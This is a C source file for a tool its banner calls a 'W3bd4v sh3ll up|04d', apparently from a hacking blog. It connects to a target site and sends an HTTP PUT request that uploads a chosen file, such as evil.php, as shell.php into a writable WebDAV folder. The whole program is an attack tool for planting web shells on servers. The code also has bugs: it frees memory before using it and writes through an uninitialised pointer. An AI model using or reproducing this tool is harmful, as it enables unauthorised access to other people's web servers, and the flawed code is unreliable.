/*
 ______________________
/\                     \
\_| Webdav File Upload |
  |   Coder => MMxM    |
  |   _________________|_
   \_/___________________/

[http://hc0der.blogspot.com]
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <getopt.h>

int help(char *name){
	printf("\n\n\t\033[1;32m[+]\033[0m W3bd4v sh3ll up|04d v0.1 8y MMxM\n");
	printf("\n\033[1;36m[*]\033[0m 0p710n5:\n\n");
	printf("\t--site	| -s => Target website without http:// or https://\n");
	printf("\t--path	| -p => path to vulnerable folder\n");
	printf("\t--create	| -c => Name of the file that will be created\n");
	printf("\t--file	| -f => File to be upload\n");
	printf("\n\033[1;36m[*]\033[0m 3x4mpl3 0f us4g3:\n\n");
	printf("\t%s --site www.vulnsite.org --path /webdav/ --create shell.php --file /home/user/evil.php\n\n",name);
	exit(EXIT_SUCCESS);
}

int error(char *err){
	perror(err);
	exit(EXIT_FAILURE);
}

char *file_content(char * file_location){
	int size;
	FILE *shell;
	shell = fopen(file_location,"rt");
	if(shell == NULL)
		error(file_location);

	fseek(shell, 0, SEEK_END);
	size = ftell(shell);
	fseek(shell, 0, SEEK_SET);

	char *buffer = malloc(size+1);
	fread(buffer,1,size,shell);
	fclose(shell);
	free(buffer);
	return buffer;
}

int request(char *target, char *file, char *create, char *path){
	char *conteudo = file_content(file);
	int size = strlen(conteudo);

	printf("\n\n\033[1;32m[+]\033[0m Try to upload file to server\n\n");
	printf("\t\033[1;36m[*]\033[0m File => %s\n",file);
	printf("\t\033[1;36m[*]\033[0m Size => %i\n",size);
	printf("\t\033[1;36m[*]\033[0m Target => %s%s\n",target,path);
	printf("\t\033[1;36m[*]\033[0m Create => %s\n\n",create);

	int msocket,recebidos;
	char resposta[5000];
	struct sockaddr_in addr;

	msocket = socket(AF_INET,SOCK_STREAM,0);
	if(msocket == -1)
		error("Fail to create socket ");

	struct hostent *host;
	host = gethostbyname(target);

	if(host == NULL)
		error("Fail to gethostbyname ");

	addr.sin_family 	= host->h_addrtype;
	addr.sin_port		= htons(80);
	addr.sin_addr		= *((struct in_addr *)host->h_addr);

	memset(&addr.sin_zero,0,sizeof(addr.sin_zero));

	printf("\033[1;36m[*]\033[0m Connecting ...\n");

	if(connect(msocket,(struct sockaddr*)&addr,sizeof(addr)) == -1)
		error("Fail to connect");

	printf("\033[1;32m[+]\033[0m Connected !!!\n");

	char *put;

	sprintf(put,"PUT %s%s HTTP/1.1\r\nContent-Length: %i\r\nHost: %s\r\nConnection: close\r\n\r\n%s\r\n\r\n\r\n",path,create,size,target,conteudo);

	printf("\033[1;32m[+]\033[0m Making request\n\n");

	if(send(msocket,put,strlen(put),0) < 0)
		error("\033[1;31m[-]\033[0m fail to make request");

	while(recebidos = recv(msocket,resposta,5000,0)){
		resposta[recebidos] = '\0';
		printf("%s\n",resposta);
	}

	close(msocket);
	return 0;
}

int main(int argc, char **argv){

	char *site = NULL, *create = NULL, *file = NULL, *path = NULL, *conteudo = NULL;
	int opt,size,erro,disp,option_index = 0;

	static struct option long_options[] = {
		{"help", no_argument, 0, 'h'},
		{"site", required_argument, 0, 's'},
		{"create", required_argument, 0, 'c'},
		{"file", required_argument, 0, 'f'},
		{"path", required_argument, 0, 'p'},
		{0}
	};

	while(1){
		opt = getopt_long(argc, argv, "hc:s:p:f:",long_options, &option_index);

		if (opt == -1)
			break;

		switch(opt){
			case 'h':
				disp = 1;
				break;

			case 's':
				site = optarg;
				break;

			case 'c':
				create = optarg;
				break;

			case 'f':
				file = optarg;
				break;

			case 'p':
				path = optarg;
				break;

			case '?':
				erro = 1;
				break;

			default:
				abort();
		}
	}

	if(disp == 1)
		help(argv[0]);


	if(erro == 1 && disp != 1){
		printf("\nBad usage !!!\nexec: %s --help , to display help\n\n",argv[0]);
		exit(EXIT_FAILURE);
	}

	if(site != NULL && create != NULL && file != NULL && path != NULL){
		request(site,file,create,path);
	} else {
		printf("\nBad usage !!!\nexec: %s --help , to display help\n\n",argv[0]);
		exit(EXIT_FAILURE);
	}
}
